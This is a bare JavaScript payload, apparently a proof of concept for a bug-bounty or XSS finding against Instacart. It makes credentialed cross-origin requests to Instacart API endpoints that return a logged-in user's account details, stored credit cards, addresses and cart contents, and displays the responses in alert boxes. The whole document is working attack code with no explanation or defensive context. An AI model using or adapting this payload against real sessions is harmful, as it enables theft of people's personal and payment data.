// 1 - Full details
var xhr2 = new XMLHttpRequest();
xhr2.onreadystatechange = function() {
	if (xhr2.readyState == XMLHttpRequest.DONE) {
		var user = JSON.parse(xhr2.responseText);
		alert(JSON.stringify(user["bundle"]["current_user"]));
	}
}
xhr2.withCredentials = true;
xhr2.open('GET', 'https://www.instacart.com/v3/bundle', true);
xhr2.send(null)
// 2 - Credit cards
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (xhr.readyState == XMLHttpRequest.DONE) {
		alert(xhr.responseText);
	}
}
xhr.withCredentials = true;
xhr.open('GET', 'https://www.instacart.com/api/v2/credit_cards?source=web', true);
xhr.send(null)
// 3 - Addresses
var xhr3 = new XMLHttpRequest();
xhr3.onreadystatechange = function() {
	if (xhr3.readyState == XMLHttpRequest.DONE) {
		alert(xhr3.responseText);
	}
}
xhr3.withCredentials = true;
xhr3.open('GET', 'https://www.instacart.com/v3/addresses', true);
xhr3.send(null)
// 4 - Cart content
var xhr4 = new XMLHttpRequest();
xhr4.onreadystatechange = function() {
	if (xhr4.readyState == XMLHttpRequest.DONE) {
		//alert(xhr4.responseText);gg
	}
}
xhr4.withCredentials = true;
xhr4.open('GET', 'https://www.instacart.com/v3/containers/cart_info', true);
xhr4.send(null)
